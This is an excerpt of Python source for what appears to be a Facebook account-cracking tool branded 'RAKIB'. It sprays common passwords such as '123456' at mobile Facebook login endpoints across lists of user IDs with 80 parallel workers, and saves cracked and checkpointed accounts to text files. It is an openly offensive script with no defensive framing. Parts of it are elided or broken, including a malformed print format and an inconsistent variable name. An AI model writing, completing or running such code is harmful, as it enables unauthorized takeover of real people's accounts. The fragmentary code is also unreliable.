...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mRAKIB_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mRAKIB_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back RAKIB Menu ")
	    Sad_Boy()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;97m[RAKIB] {loop}|{len(self.id)} [OK][{len(ok)}]")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
               ...
               'authority': 'm.facebook.com',
                ...
                'referer': 'https://m.facebook.com/?stype=lo&jlou=AffTjcPhn3IVW5lhSL3Ts1jNGR8HsdvLctnraWjaa3IkF9K3MGvh52Z1nM0GG7Y4SlLYVInCNV3PZkSvAl1SYfGxeAm3T9EKjJJ09QXCLyF0fA&smuh=6105&lh=Ac8KdbHX5jJsSodi8i8&wtsid=rdr_0irTyI71j9ASXhxYN&_rdr',
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with javed(max_workers=80) as RAKIBworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = ["123456"]
                            pwx = ["123456789"]
                        RAKIBworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
